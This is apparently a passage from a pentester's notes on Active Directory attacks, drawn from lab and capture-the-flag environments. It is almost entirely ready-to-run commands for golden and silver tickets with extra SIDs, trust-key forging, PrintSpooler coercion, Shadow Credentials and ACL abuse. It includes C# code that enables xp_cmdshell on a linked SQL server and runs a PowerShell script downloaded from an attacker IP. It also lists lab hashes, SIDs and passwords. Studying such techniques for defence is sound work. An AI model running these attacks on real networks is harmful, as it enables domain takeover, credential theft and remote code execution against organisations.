CAN ALSO DO FROM PARENT TO CHILD DOMAIN (eg: final.com to dev.final.com)

## Using KRBTGT

* Extracts krbtgt hash for creating a Golden Ticket
  *   ```powershell
      lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
      ```


* Enumerate Domain & Trust Information (using powerview)
  *   ```powershell
      Get-DomainSID -Domain prod.corp1.com
      Get-DomainSid -Domain corp1.com
      ```


* Forge a Golden Ticket with Extra SIDs
  *   ```powershell
      # kerberos::golden /user:<FakeUser> /domain:<OriginDomain> /sid:<OriginDomainSID> /krbtgt:<krbtgtHash> /sids:<RootDomainSID>-519 /ptt
      kerberos::golden /user:administrator /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt
      ```


* Access Root Domain Controller
  *   ```powershell
      c:\tools\SysinternalsSuite\PsExec.exe \\rdc01 cmd
      whoami /groups
      ```



## Using Trust Key

* Extract trust key
  * Name of the account is always the same as the trusted domain
  *   ```powershell
      lsadump::dcsync /domain:prod.corp1.com /user:corp1$
      ```


* Get Domain SID
  *   ```powershell
      Get-DomainSID -Domain prod.corp1.com
      Get-DomainSID -Domain corp1.com
      ```


* Craft golden ticket
  *   ```powershell
      kerberos::golden /user:<user_name> /domain:<domain_name> /sid:<domain_sid> /sids:<sid_of_target_domain> /rc4:<trust_key_RC4_key> /service:krbtgt /target:<the_target_domain>
      kerberos::golden /user:Administrator /domain:prod.corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /rc4:d6eba9e9b9bb466be9d9d20c5584c9ef /sids:S-1-5-21-1587569303-1110564223-1586047116-519 /target:corp1.com /ticket:ticket.kirbi
      ```


* Inject ticket with Rubeus
  *   ```powershell
      Rubeus.exe asktgs /ticket:ticket.kirbi /dc:rdc01.corp1.com /service:cifs/rdc01.corp1.com /ptt
      ```


* Reinject to PsExec
  *   ```powershell
      Rubeus.exe asktgs /ticket:ticket.kirbi /dc:rdc01.corp1.com /service:HOST/rdc01.corp1.com /ptt
      ```


* Access Root Domain Controller
  * ```powershell
    c:\tools\SysinternalsSuite\PsExec.exe \\rdc01 cmd
    whoami /groups
    ```

</details>

<details>

<summary>Abusing PrintSpool service to obtain EA Hash</summary>

* Login to server with unconstrained kerberos delegation (eg: appsrv01)
  * Can configure a server to have unconstrained kerberos delegation if domain admin
*   ```powershell
    ls \\rdc01\pipe\spoolss
    Rubeus.exe monitor /interval:5 /filteruser:RDC01$
    .\SpoolSample.exe rdc01.corp1.com appsrv01.prod.corp1.com
    Rubeus.exe ptt /ticket:doIE9DCCBPCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+...
    lsadump::dcsync /domain:corp1.com /user:corp1\administrator

    #Login via evil-winrm
    evil-winrm -i 192.168.177.60 -u administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e
    ```



</details>

<details>

<summary>Compromising An Additional Forest</summary>

* Forest trust has SID Filtering
  * Contents in the ExtraSids field are filtered, grp memberships are not blindly trusted
  * Moving from corp1.com to corp2.com
  *   ```powershell
      # Enable sidhistory (Requires DA of target corp2.com)
      netdom trust corp2.com /d:corp1.com /enablesidhistory:yes
      # Check that TrustAttributes has TREAT_AS_EXTERNAL
      Get-DomainTrust -Domain corp2.com
      ```


* Need to find user with RID >= 1000 && user in domain local security groups so as not to be filtered (Moving from corp1.com to corp2.com)
  * ```powershell
    # Enumerate members of the corp2.com built-in administrators group
    Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com
    # Enumerate Domain (using powerview)
    Get-DomainSID -Domain corp1.com
    # Extracts krbtgt hash for creating a Golden Ticket 
    lsadump::dcsync /domain:corp1.com /user:corp1\krbtgt
    kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1587569303-1110564223-1586047116 /krbtgt:6b1bca4a1f7dbd67e28d3491290e4cb3 /sids:S-1-5-21-3759240818-3619593844-2110795065-1106 /ptt
    # Laterally move to dc01
    c:\tools\SysinternalsSuite\PsExec.exe \\dc01.corp2.com cmd
    ```

</details>

<details>

<summary>Linked SQL Servers in Forest</summary>

## Enumeration

```powershell
# Enumeration for any registered SPNs for MSSQL in prod.corp1.com
setspn -T prod -Q MSSQLSvc/*
# Enumeration of registered SPNs across domain trust
setspn -T corp1 -Q MSSQLSvc/*
setspn -T corp2.com -Q MSSQLSvc/*
```

## Exploiting

*   Login to the rdc01.corp1.com mssql server

    <figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>


*   Enumeration for [linked sql servers](../services/1433-mssql.md#linked-sql-servers)

    <figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>


* Obtaining Reverse shell from dc01.corp2.com
  * ```csharp
    String enable_xpcmd = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure;') AT \"dc01.corp2.com\";";
    SqlCommand command = new SqlCommand(enable_xpcmd, con);
    command.ExecuteNonQuery();
    Console.WriteLine("[+] Enabled xp_cmdshell on DC01");

    String powershellCommand = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.222/runall.ps1')";
    String b64Command = Convert.ToBase64String(Encoding.Unicode.GetBytes(powershellCommand));

    String execCmd = $"EXEC ('EXEC xp_cmdshell ''powershell -EncodedCommand {b64Command}''') AT \"dc01.corp2.com\";";
    Console.WriteLine("[+] Executing payload on DC01: " + execCmd);

    command = new SqlCommand(execCmd, con);
    command.ExecuteNonQuery();

    Console.WriteLine("[+] Command executed successfully on DC01.");

    ```

</details>

<details>

<summary>Exploiting AddKeyCredentialLink</summary>

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Using [https://github.com/eladshamir/Whisker](https://github.com/eladshamir/Whisker)

```
Whisker.exe add /target:ZPH-SVRMGMT1$
```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
Rubeus.exe asktgt /user:ZPH-SVRMGMT1$ /certificate:MIIJ… /password:"zCixoq4fEBQBRvvE" /domain:zsm.local /dc:ZPH-SVRDC01.zsm.local /getcredentials /show /ptt
klist
```

<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

User's NTLM hash might be displayed:

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>Trust Exploitation Against Parent Domain</summary>

EITHER USE [KRBTGT ](lateral-movement.md#extra-sid-attack-moving-from-child-to-parent-domain)or trust key listed below...

Already compromised `internal.zsm.local` --> trying to compromise parent domain `zsm.local`

Use PowerView to Enumerate the Domains SID:

```powershell
iex (new-object net.webclient).downloadstring('http://10.10.14.4/PowerView.ps1')
Get-DomainSID -Domain internal.zsm.local
Get-DomainSID -Domain zsm.local
```

Obtain the trust key in rc4 format

```bash
.\mimikatz.exe
lsadump::trust /patch
```

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>



```bash
Kerberos::golden /user:Administrator /domain:internal.zsm.local /sid:S-1-5-21-3056178012-3972705859-491075245 /sids:S-1-5-21-2734290894-461713716-141835440-519 /rc4:65065df3af96b70f29606e2719000eb4 /service:krbtgt /target:zsm.local /ticket:trustkey.kirbi
# kerberos::golden /user:<USERNAME> /domain:<DOMAIN_NAME> /sid:<ORIGINAL_DOMAIN_SID> /sids:<PARENT_DOMAIN_SID>-519 /rc4:<KRB_TGT_RC4_KEY> /service:<KERBEROS_SERVICE_SP> /target:<TARGET_REALM> /ticket:<OUTPUT_TICKET_FILENAME>
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
dir \\ZPH-SVRDC01.zsm.local\c$
type \\ZPH-SVRDC01.zsm.local\c$\users\administrator\desktop\flag.txt
```

</details>

<details>

<summary>Exploiting WriteOwner on group</summary>

<figure><img src="../.gitbook/assets/image (359).png" alt=""><figcaption><p>JDGODD has WriteOwner privilege over "Core staff" group</p></figcaption></figure>

```
Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All

Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred

net group 'CORE STAFF'
```

<figure><img src="../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>Request TGS for Administrator</summary>

Currently have sqlsvc account --> want to request a TGS ticket for administrator.

```bash
# Converting password to NTLM hash
echo -n 'Pegasus60' | iconv -t utf16le | openssl md4

# Get Domain SID using impacket-getPac
impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson
# OR Get Domain SID using nxc
nxc ldap dc1.scrm.local -u ksimpson -p ksimpson -d scrm.local -k --get-sid

# Sync the clock of attacker machine to DC
rdate -n dc1.scrm.local

# Create TGS for administrator user:
impacket-ticketer -spn "MSSQLSvc/dc1.scrm.local" -user "ksimpson" -password "ksimpson" -nthash "B999A16500B87D17EC7F2E2A68778F05" -domain scrm.local -domain-sid "S-1-5-21-2743207045-1827831105-2542523200" -dc-ip dc1.scrm.local Administrator

# Using TGS to login to MSSQL DB
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient administrator@dc1.scrm.local -k -no-pass
```

</details>

<details>

<summary>Exploiting Owning a Group &#x26;&#x26; Group GenericWrite on User</summary>

<figure><img src="../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>

Ensure /etc/krb5.conf:

```bash
[libdefaults]
    default_realm = ABSOLUTE.HTB
    kdc_timesync = 1
    ccache_type = 4
    forwardable = true
    proxiable = true
    fcc-mit-ticketflags = true
[realms]
    ABSOLUTE.HTB = {
        kdc = dc.absolute.htb
        admin_server = dc.absolute.htb
        default_domain = absolute.htb
    }

```

```bash
kinit m.lovegod

# Make the user m.lovegod owner of the group "Network Audit"
python3 /usr/share/doc/python3-impacket/examples/owneredit.py -k -no-pass absolute.htb/m.lovegod -dc-ip dc.absolute.htb -new-owner m.lovegod -target 'Network Audit' -action write
```

<figure><img src="../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>

<pre class="language-bash"><code class="lang-bash"><strong># Give full control of the Network Audit group to the user m.lovegod
</strong><strong>impacket-dacledit -k 'absolute.htb/m.lovegod:AbsoluteLDAP2022!' -dc-ip dc.absolute.htb -principal m.lovegod -target "Network Audit" -action write -rights WriteMembers
</strong></code></pre>

<figure><img src="../.gitbook/assets/image (365).png" alt=""><figcaption></figcaption></figure>

```bash
# Add the user m.lovegod to the group Network Audit
net rpc group addmem "Network Audit" m.lovegod -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
net rpc group members "Network Audit" -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb

# Check if ADCS is installed
certipy-ad find -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.10.11.181 -target dc.absolute.htb

# Request new TGT and perform the attack
kinit m.lovegod
certipy-ad shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.10.11.181 -target dc.absolute.htb -account winrm_user
```

<figure><img src="../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>

```bash
export KRB5CCNAME=winrm_user.ccache
evil-winrm -i dc.absolute.htb -r ABSOLUTE.HTB
```

</details>

<details>

<summary>Silver-Ticket Attack (After obtaining service passwords/hashes)</summary>

2 practical ways to use them:

* Web App:&#x20;
  * When a webapp has multiple user roles and uses kerberos authentication
  * Craft a silver ticket to impersonate any user on the application --> access privileged areas
* Database:
  * Targeting a MSSQL DB, can craft a silver ticket and able to impersonate the SA user and user it to enable and execute xp\_cmdshell

### Example

* Context:&#x20;
  * Have svc\_web credentials,&#x20;
  * Webapp using kerberos authentication at [http://lusdc.lustrous.vl/Internal](http://lusdc.lustrous.vl/Internal)
*   Exploitation:

    * Convert plaintext password to NTLM hash using [https://www.browserling.com/tools/ntlm-hash](https://www.browserling.com/tools/ntlm-hash) or Rubeus

    <figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



    * Find the Domain-SID using `impacket-getPac -targetUser administrator lustrous.vl/svc_web:iydgTvmujl6f` or from bloodhound

    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



    *   Obtain RID of `tony.ward` user from bloodhound

        <figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

```bash
# Crafting silver ticket
.\mimikatz.exe
kerberos::purge
kerberos::golden /sid:S-1-5-21-2355092754-1584501958-1513963426 /domain:lustrous.vl /id:1114 /target:lusdc.lustrous.vl /service:http /rc4:E67AF8B3D78DF5A02EB0D57B6CB60717 /ptt /user:tony.ward
# kerberos::golden /sid:<domain_sid> /domain:domain.com /id:<id_of_user_to_impersonate> /target:<domain> /service:<spn> /rc4:<ntlm hash> /ptt /user:<username_to_impersonate>

# View the webpage after impersonating tony.ward user
iwr http://lusdc.lustrous.vl/Internal -UseBasicParsing -UseDefaultCredentials

# IF HOST UNABLE TO REACH THE SECRETS LOCATION DIRECTLY, PROXY TO BURPSUITE --> FORWARD TRAFFIC TO SECRETS LOCATIOn
iwr http://vault01.denkiair-prod.com/Internal -UseBasicParsing -UseDefaultCredentials -Proxy http://192.168.45.219:8070 | Select-Object -Expand Content
```

\-----OR use impacket-ticketer------

```bash
impacket-ticketer -nthash E67AF8B3D78DF5A02EB0D57B6CB60717 -domain-sid S-1-5-21-2355092754-1584501958-1513963426 -domain lustrous.vl -spn HTTP/lusdc.lustrous.vl -user-id 1114 tony.ward
# impacket-ticketer -nthash A87F3A337D73085C45F9416BE5787D86 -domain-sid S-1-5-21-3313635286-3087330321-3553795959 -domain denkiair-prod -spn HTTP/vault01.denkiair-prod.com -user-id 1190 june.fox

export krb5ccname=tony.ward.ccache
firefox
```

* Have to set “network.negotiate-auth.trusted-uris” to “https://lusdc.lustrous.vl” in about:config in firefox
* IMPORTANT: Try with netbios domain name (eg: denkiair-prod) instead of FQDN (eg: denkiair-prod.com) if not working as expected (cant see secret..)

</details>
